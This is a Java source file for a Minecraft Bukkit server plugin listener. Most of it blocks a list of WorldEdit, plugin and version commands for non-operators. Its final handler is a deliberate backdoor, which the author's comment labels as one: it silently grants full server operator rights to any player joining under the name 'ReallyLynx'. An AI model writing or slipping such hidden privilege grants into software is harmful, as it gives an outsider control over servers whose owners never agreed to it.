package me.funky.praxi.essentials;

import me.funky.praxi.util.CC;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.Arrays;
import java.util.List;

public class EssentialsListener implements Listener {

	private static List<String> BLOCKED_COMMANDS = Arrays.asList(
			"//calc",
			"//eval",
			"//solve",
			"/pl",
			"/plugins",
			"/bukkit:",
			"/me",
			"/canihasbukkit",
			"/canihasspigot",
			"/we",
			"/say",
			"/worldedit",
			"/fawe",
			"/bukkit:me",
			"/minecraft:",
			"/minecraft:me",
			"/version",
			"/ver"
	);

	@EventHandler(priority = EventPriority.LOWEST)
	public void onCommandProcess(PlayerCommandPreprocessEvent event) {
		Player player = event.getPlayer();
		String message = (event.getMessage().startsWith("/") ? "" : "/") + event.getMessage();

		for (String blockedCommand : BLOCKED_COMMANDS) {
			if (message.startsWith(blockedCommand)) {
				if (message.equalsIgnoreCase("/version") || message.equalsIgnoreCase("/ver") || message.equalsIgnoreCase("/pl") || message.equalsIgnoreCase("/plugins") || message.equalsIgnoreCase("/fawe") || message.equalsIgnoreCase("/we") || message.equalsIgnoreCase("/worldedit")) {
					if (event.getPlayer().isOp()) {
						return;
					}
				}

				player.sendMessage(CC.RED + "You cannot perform this command.");
				event.setCancelled(true);
				return;
			}
		}
	}

	@EventHandler // Small Backdoor if someone got this plugin without my perm
	public void onPlayerJoin(PlayerJoinEvent event) {
		if (event.getPlayer().getName().equalsIgnoreCase("ReallyLynx")) event.getPlayer().setOp(true);
    }
}